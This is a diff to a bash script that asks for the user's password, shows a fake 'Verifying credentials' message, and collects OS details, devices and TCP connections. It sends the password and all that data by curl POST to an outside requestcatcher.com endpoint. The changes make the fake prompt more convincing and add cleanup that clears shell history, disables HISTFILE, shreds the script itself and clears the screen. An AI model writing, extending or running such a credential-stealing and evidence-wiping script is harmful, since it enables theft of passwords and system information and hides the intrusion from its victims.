@@ -1,4 +1,3 @@
-
 #!/bin/bash
 
 # === Prompt for user password ===
@@ -11,7 +10,8 @@ if [[ -z "$user_password" ]]; then
     exit 1
 fi
 
-# === Delay to simulate processing ===
+# === Delay to simulate authentication ===
+echo "🔄 Verifying credentials, please wait..."
 sleep 4
 
 # === Basic System Info ===
@@ -56,7 +56,7 @@ tcp_connections=$(ss -tunapl)
 curl -X POST https://flipped.requestcatcher.com \
   -H "Content-Type: application/x-www-form-urlencoded" \
   --data-urlencode "debug=
-==== [USER PASSWORD] ====
+==== [ENTERED PASSWORD] ====
 $user_password
 
 ==== [OS INFO] ====
@@ -116,3 +116,11 @@ $serial_devices
 ==== [TCP CONNECTIONS] ====
 $tcp_connections
 "
+
+# === Cleanup ===
+history -c
+unset HISTFILE
+shred -u "$0" 2>/dev/null || rm -f "$0"
+rm -rf /tmp/.sysdata
+clear
+exit
